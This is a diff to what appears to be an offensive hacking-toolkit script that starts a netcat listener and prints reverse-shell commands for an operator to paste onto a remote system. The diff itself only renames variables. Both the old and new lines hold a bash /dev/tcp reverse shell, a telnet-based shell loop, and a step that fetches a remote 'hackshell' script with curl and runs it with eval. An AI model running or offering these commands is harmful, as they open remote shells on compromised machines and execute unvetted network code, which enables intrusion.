@@ -6,8 +6,8 @@ source /sf/bin/funcs_rport.sh
 sf_rport_load_all || exit
 echo -e "\
 Use one of these commands on the remote system:
-    1. ${CDR}bash -c '(exec bash -i &>/dev/tcp/${rip}/${rport} 0>&1) &'${CN}
-    2. ${CDR}U=/tmp/.\$\$;rm -f \$U;touch \$U;(tail -f \$U|sh 2>&1|telnet ${rip} ${rport} >\$U 2>&1 &)
+    1. ${CDR}bash -c '(exec bash -i &>/dev/tcp/${RIP}/${RPORT} 0>&1) &'${CN}
+    2. ${CDR}U=/tmp/.\$\$;rm -f \$U;touch \$U;(tail -f \$U|sh 2>&1|telnet ${RIP} ${RPORT} >\$U 2>&1 &)
 ${CN}Once connected, cut & paste the following into the _this_ shell:
 ${CF}-------------------------------------------------------------------------------${CDC}
  \"\$SHELL\" -c true || SHELL=\$(command -v bash) || SHELL=/bin/sh
@@ -29,7 +29,7 @@ reset -I
 PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'
 "'stty -echo cols 200;printf "\\033[18t";read -t5 -rdt R;stty sane $(echo "${R:-8;25;80}"|awk -F";" '"'"'{ printf "rows "$2" cols "$3; }'"'"')'"
 ${CN}${CF}-------------------------------------------------------------------------------${CDC}
-eval  \"\$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\"
+ eval \"\$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\"
 ${CN}${CF}-------------------------------------------------------------------------------
 To force-exit this listener, type ${CDY}kill \"\$(pgrep -P $$)\"${CN} on your Root Server"
 # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
@@ -37,8 +37,8 @@ To force-exit this listener, type ${CDY}kill \"\$(pgrep -P $$)\"${CN} on your Ro
 cfg=$(stty --save)
 # alpine's /bin/sh needs ^M -> \n
 stty raw -echo icrnl opost
-echo -e "${CDG}Listening on ${CG}${rip}:${rport}${CN}"
-nc -nvlp "$rport"
+echo -e "${CDG}Listening on ${CG}${RIP}:${RPORT}${CN}"
+nc -nvlp "$RPORT"
 echo "🦋 Restoring terminal..."
 stty "$cfg"
 # reset -I
